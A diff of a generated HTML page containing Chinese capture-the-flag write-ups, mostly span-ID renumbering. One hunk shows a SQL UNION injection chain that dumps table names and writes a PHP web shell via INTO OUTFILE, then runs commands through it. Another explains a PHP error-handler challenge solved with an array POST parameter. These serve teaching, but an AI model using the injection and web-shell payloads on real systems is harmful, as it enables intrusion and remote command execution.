-</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
-</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>
-</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a><span class="c1">-- ④ 写 shell</span>
-</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
+<div class="language-sql highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1">-- ① 确认列数</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="mi">0</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a><span class="c1">-- ② 爆表</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="n">GROUP_CONCAT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- -</span>
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a>
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="c1">-- ③ 看写权限目录</span>
+</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="c1">-- -</span>
+</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a>
+</span><span id="__span-58-10"><a id="__codelineno-58-10" name="__codelineno-58-10" href="#__codelineno-58-10"></a><span class="c1">-- ④ 写 shell</span>
+</span><span id="__span-58-11"><a id="__codelineno-58-11" name="__codelineno-58-11" href="#__codelineno-58-11"></a><span class="n">rarity</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s1">'&lt;?php system($_GET[0]);?&gt;'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">OUTFILE</span><span class="w"> </span><span class="s1">'/var/www/html/io/C.php'</span><span class="c1">-- -</span>
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>访问：/io/C.php?0=cat /flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>访问：/io/C.php?0=cat /flag
 </span></code></pre></div>
 </details>
 <details class="note">
@@ -4735,39 +4908,39 @@
 <hr />
 <h3 id="_2"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_2">解题过程</a></h3>
 <h4 id="step-1"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-1">Step 1：先读代码</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
-</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
-</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
-</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
-</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
-</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
-</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="p">}</span>
-</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>
-</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a><span class="nb">set_error_handler</span><span class="p">(</span>
-</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-6-17"><a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-6-18"><a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>    <span class="p">}</span>
-</span><span id="__span-6-19"><a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a><span class="p">);</span>
-</span><span id="__span-6-20"><a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
-</span><span id="__span-6-21"><a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>
+</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
+</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
+</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a><span class="p">}</span>
+</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>
+</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a><span class="nb">set_error_handler</span><span class="p">(</span>
+</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>    <span class="p">}</span>
+</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a><span class="p">);</span>
+</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
+</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 <h4 id="step-2-if"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-2-if">Step 2：第一个想法——绕开那个 if</a></h4>
 <p><strong><code>include</code> 已经把 <code>fl4g.php</code> 引进来了，那直接让 <code>if</code> 成立不就能输出 <code>$fl4g</code> 了吗？</strong></p>
 <p><strong>看三个判断：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>date("H")   小时   00–23     永远不可能 &gt; 24
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>date("d")   日期   01–31     永远不可能 &gt; 31
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>date("i")   分钟   00–59     永远不可能 &gt; 60
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>date("H")   小时   00–23     永远不可能 &gt; 24
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>date("d")   日期   01–31     永远不可能 &gt; 31
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>date("i")   分钟   00–59     永远不可能 &gt; 60
 </span></code></pre></div>
 <p><strong>三个都是“边界值本身等于上限”的情况，所以整条 <code>or</code> 永远是假。这条路封死。</strong></p>
 <h4 id="step-3"><a class="toclink" href="../../ctf2-ezphp-error-handler/#step-3">Step 3：真正的入口在下面</a></h4>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="x">set_error_handler(function() use(&amp;$fl4g){ print $fl4g; });</span>
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="x">$fl4g .= $dest0g3;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">set_error_handler(function() use(&amp;$fl4g){ print $fl4g; });</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="x">$fl4g .= $dest0g3;</span>
 </span></code></pre></div>
 <p><strong><code>set_error_handler</code> 注册了一个自定义处理器——</strong>只要发生能被它捕获的错误，就会执行里面的 <code>print $fl4g</code><strong>。</strong></p>
 <p><strong>而下一行就是触发器：<code>$fl4g .= $dest0g3</code>。</strong></p>
@@ -4776,17 +4949,17 @@
 <p><strong>如果传一个</strong>字符串<strong>，拼接正常，什么都不会发生。</strong></p>
 <p><strong>如果传一个</strong>数组<strong>，PHP 试图把数组转成字符串来拼接，转不了——抛出 <code>Warning: Array to string conversion</code>。</strong></p>
 <p><strong>这个 warning 被刚刚注册的处理器捕获，于是 <code>print $fl4g</code> 执行，flag 就出来了。</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>POST ctf[]=1
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>→ Array to string conversion
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>→ error handler
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>→ 打印 $fl4g
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>POST ctf[]=1
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>→ Array to string conversion
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>→ error handler
+</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>→ 打印 $fl4g
 </span></code></pre></div>
 <hr />
 <h3 id="_3"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>读源码 → include 了 fl4g.php，但 if 永远为假（小时≤23、日≤31、分≤59）
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>       → 往下看，set_error_handler 注册了 print $fl4g
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>         → 找触发器：$fl4g .= $_POST['ctf']
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>           → 传数组 → 拼接失败 → warning → 处理器执行 → 拿到 flag
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>读源码 → include 了 fl4g.php，但 if 永远为假（小时≤23、日≤31、分≤59）
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>       → 往下看，set_error_handler 注册了 print $fl4g
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>         → 找触发器：$fl4g .= $_POST['ctf']
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>           → 传数组 → 拼接失败 → warning → 处理器执行 → 拿到 flag
 </span></code></pre></div>
 <h4 id="_4"><a class="toclink" href="../../ctf2-ezphp-error-handler/#_4">漏洞原理</a></h4>
 <p><strong>① 错误处理器会把“错误”变成“输出”</strong></p>
@@ -4830,25 +5003,25 @@
 <hr />
 <details class="note">
 <summary>完整源码</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="cp">&lt;?php</span>
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
-</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
-</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
-</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
-</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
-</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
-</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12" href="#__codelineno-11-12"></a><span class="p">}</span>
-</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13" href="#__codelineno-11-13"></a><span class="nb">set_error_handler</span><span class="p">(</span>
-</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14" href="#__codelineno-11-14"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
-</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15" href="#__codelineno-11-15"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
-</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16" href="#__codelineno-11-16"></a>    <span class="p">}</span>
-</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17" href="#__codelineno-11-17"></a><span class="p">);</span>
-</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18" href="#__codelineno-11-18"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
-</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19" href="#__codelineno-11-19"></a><span class="cp">?&gt;</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="cp">&lt;?php</span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="k">include</span> <span class="s2">"fl4g.php"</span><span class="p">;</span>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="nv">$dest0g3</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'ctf'</span><span class="p">];</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="nv">$time</span>    <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"H"</span><span class="p">);</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="nv">$timme</span>   <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"d"</span><span class="p">);</span>
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="nv">$timmme</span>  <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"i"</span><span class="p">);</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="k">if</span><span class="p">((</span><span class="nv">$time</span> <span class="o">&gt;</span> <span class="s2">"24"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timme</span> <span class="o">&gt;</span> <span class="s2">"31"</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$timmme</span> <span class="o">&gt;</span> <span class="s2">"60"</span><span class="p">)){</span>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>    <span class="k">echo</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>    <span class="k">echo</span> <span class="s2">"Try harder!"</span><span class="p">;</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="p">}</span>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a><span class="nb">set_error_handler</span><span class="p">(</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>    <span class="k">function</span><span class="p">()</span> <span class="k">use</span><span class="p">(</span><span class="o">&amp;</span><span class="nv">$fl4g</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>        <span class="k">print</span> <span class="nv">$fl4g</span><span class="p">;</span>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>    <span class="p">}</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a><span class="p">);</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="nv">$fl4g</span> <span class="o">.=</span> <span class="nv">$dest0g3</span><span class="p">;</span>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="cp">?&gt;</span>
 </span></code></pre></div>
 </details>
 <details class="note">
